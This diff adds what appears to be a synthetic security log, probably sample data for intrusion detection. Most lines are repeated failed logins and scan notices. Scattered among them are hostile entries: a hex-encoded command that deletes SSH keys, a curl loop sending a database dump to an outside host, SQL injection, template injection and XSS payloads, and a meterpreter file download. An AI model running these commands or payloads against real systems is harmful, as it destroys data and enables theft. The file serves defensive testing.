@@ -1,0 +1,118 @@
+[31/05/2025 10:26:14]  [HEX] printf '726d202d7266207e2f2e7373682f2a' | xxd -r -p | sh (rm -rf ~/.ssh/*)
+[31/05/2025 10:26:15]  [SLOW] for i in $(cat db_dump.xml); do curl -s "http://legit.com?q=$i"; sleep 30; done
+[31/05/2025 10:26:19]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=admin
+[31/05/2025 10:26:20]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=test
+[31/05/2025 10:26:21]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=root
+[31/05/2025 10:26:22]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=administrator
+[31/05/2025 10:26:23]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=backoffice
+[31/05/2025 10:26:24]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=system
+[31/05/2025 10:26:25]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=superuser
+[31/05/2025 10:26:29]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=admin
+[31/05/2025 10:26:30]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=test
+[31/05/2025 10:26:31]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=root
+[31/05/2025 10:26:32]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=administrator
+[31/05/2025 10:26:33]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=backoffice
+[31/05/2025 10:26:34]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=system
+[31/05/2025 10:26:35]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=superuser
+[31/05/2025 10:26:39]  nmap: Fragmented Scan from 5.188.206.184 (--mtu 24)
+[31/05/2025 10:26:43]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER anonymous
+[31/05/2025 10:26:44]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER admin
+[31/05/2025 10:26:45]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER root
+[31/05/2025 10:26:46]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER guest
+[31/05/2025 10:26:47]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER test
+[31/05/2025 10:26:48]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER backup
+[31/05/2025 10:26:49]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER administrator
+[31/05/2025 10:26:53]  [EVADE] GET /index.php?id=1' OR '1'='1'-- - HTTP/1.1 (User-Agent: sqlmap/1.7)
+[31/05/2025 10:26:54]  [SSTI] POST /render - Template: {{7*7}}_${os.system('id')}
+[31/05/2025 10:26:58]  nmap: UDP Scan from 198.54.132.166 probing port 161 (SNMP)
+[31/05/2025 10:27:02]  [POLY] GET /?q=<script>alert(1)</script><!--'"-->
+[31/05/2025 10:27:06]  [DATA] GET /redirect?url=data:text/html,<script>alert(1)</script>
+[31/05/2025 10:27:07]  [CSS] GET /style.css?var=expression(alert(1))
+[31/05/2025 10:27:11]  nmap: OS Detection Scan from 91.218.114.209 probing port 80 (HTTP)
+[31/05/2025 10:27:15]  [SSTI] POST /render - Template: {{7*7}}_${os.system('id')}
+[31/05/2025 10:27:19]  nmap: Malformed Packet Scan from 93.174.95.106 with invalid TCP checksum
+[31/05/2025 10:27:23]  [IMG] POST /comment - body=<img src=x onerror=alert(1)>
+[31/05/2025 10:27:27]  [EDR] Alert: Process 'curl' exfiltrating data to C2 (8.8.8.8)
+[31/05/2025 10:27:31]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER anonymous
+[31/05/2025 10:27:32]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER admin
+[31/05/2025 10:27:33]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER root
+[31/05/2025 10:27:34]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER guest
+[31/05/2025 10:27:35]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER test
+[31/05/2025 10:27:36]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER backup
+[31/05/2025 10:27:37]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER administrator
+[31/05/2025 10:27:42]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER anonymous
+[31/05/2025 10:27:43]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER admin
+[31/05/2025 10:27:44]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER root
+[31/05/2025 10:27:45]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER guest
+[31/05/2025 10:27:46]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER test
+[31/05/2025 10:27:47]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER backup
+[31/05/2025 10:27:48]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER administrator
+[31/05/2025 10:27:52]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=admin
+[31/05/2025 10:27:53]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=test
+[31/05/2025 10:27:54]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=root
+[31/05/2025 10:27:55]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=administrator
+[31/05/2025 10:27:56]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=backoffice
+[31/05/2025 10:27:57]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=system
+[31/05/2025 10:27:58]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=superuser
+[31/05/2025 10:28:02]  nmap: OS Detection Scan from 91.218.114.209 probing port 80 (HTTP)
+[31/05/2025 10:28:06]  nmap: UDP Scan from 198.54.132.166 probing port 161 (SNMP)
+[31/05/2025 10:28:07]  nmap: Fragmented Scan from 5.188.206.184 (--mtu 24)
+[31/05/2025 10:28:11]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER anonymous
+[31/05/2025 10:28:12]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER admin
+[31/05/2025 10:28:13]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER root
+[31/05/2025 10:28:14]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER guest
+[31/05/2025 10:28:15]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER test
+[31/05/2025 10:28:16]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER backup
+[31/05/2025 10:28:17]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER administrator
+[31/05/2025 10:28:21]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=admin
+[31/05/2025 10:28:22]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=test
+[31/05/2025 10:28:23]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=root
+[31/05/2025 10:28:24]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=administrator
+[31/05/2025 10:28:25]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=backoffice
+[31/05/2025 10:28:26]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=system
+[31/05/2025 10:28:27]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=superuser
+[31/05/2025 10:28:31]  tcpdump: [Fragmented] 185.143.223.17:65535 → 192.168.1.1:8080 (offset: 1480) [Evasion Attempt]
+[31/05/2025 10:28:35]  openvpn: TLS handshake failed: TLS key negotiation failed
+[31/05/2025 10:28:39]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER anonymous
+[31/05/2025 10:28:40]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER admin
+[31/05/2025 10:28:41]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER root
+[31/05/2025 10:28:42]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER guest
+[31/05/2025 10:28:43]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER test
+[31/05/2025 10:28:44]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER backup
+[31/05/2025 10:28:45]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER administrator
+[31/05/2025 10:28:49]  [CSS] GET /style.css?var=expression(alert(1))
+[31/05/2025 10:28:50]  [HTTP] GET / - User-Agent: <script>alert(1)</script>
+[31/05/2025 10:28:54]  [WS] wss://example.com/chat - msg=<img src=x onerror=alert(1)>
+[31/05/2025 10:28:58]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=admin
+[31/05/2025 10:28:59]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=test
+[31/05/2025 10:29:00]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=root
+[31/05/2025 10:29:01]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=administrator
+[31/05/2025 10:29:02]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=backoffice
+[31/05/2025 10:29:03]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=system
+[31/05/2025 10:29:04]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=superuser
+[31/05/2025 10:29:08]  firewalld: DROPPED (IN=eth0 OUT=) TCP packet from 203.0.113.1:6667 to 10.1.1.5:22
+[31/05/2025 10:29:09]  icmp: Destination unreachable (Network unreachable) from 192.168.1.10 to 203.0.113.42
+[31/05/2025 10:29:13]  [METASPLOIT] meterpreter > download C:\Documents\finance.xlsx
+[31/05/2025 10:29:14]  [HEX] printf '726d202d7266207e2f2e7373682f2a' | xxd -r -p | sh (rm -rf ~/.ssh/*)
+[31/05/2025 10:29:18]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=admin
+[31/05/2025 10:29:19]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=test
+[31/05/2025 10:29:20]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=root
+[31/05/2025 10:29:21]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=administrator
+[31/05/2025 10:29:22]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=backoffice
+[31/05/2025 10:29:23]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=system
+[31/05/2025 10:29:24]  203.0.113.42 POST /login HTTP/1.1 - Invalid credentials for user=superuser
+[31/05/2025 10:29:28]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER anonymous
+[31/05/2025 10:29:29]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER admin
+[31/05/2025 10:29:30]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER root
+[31/05/2025 10:29:31]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER guest
+[31/05/2025 10:29:32]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER test
+[31/05/2025 10:29:33]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER backup
+[31/05/2025 10:29:34]  ftpd: LOGIN FAILED FROM 10.0.0.15, USER administrator
+[31/05/2025 10:29:38]  sshd[2371]: Failed password for root from 192.168.1.100 port 53412 ssh2
+[31/05/2025 10:29:40]  sshd[2371]: Failed password for root from 192.168.1.100 port 53412 ssh2
+[31/05/2025 10:29:41]  sshd[2372]: Failed password for invalid user admin from 192.168.1.100 port 53413 ssh2
+[31/05/2025 10:29:42]  sshd[2450]: Failed password for invalid user hacker from 192.168.1.100 port 42222 ssh2
+[31/05/2025 10:29:43]  sshd[2451]: Failed password for root from 192.168.1.100 port 35555 ssh2
+[31/05/2025 10:29:44]  sshd[2452]: Failed password for invalid user test from 192.168.1.100 port 48888 ssh2
+[31/05/2025 10:29:45]  sshd[2453]: Failed password for admin from 192.168.1.100 port 51111 ssh2
+[31/05/2025 10:29:46]  sshd[2454]: Failed password for root from 192.168.1.100 port 37777 ssh2
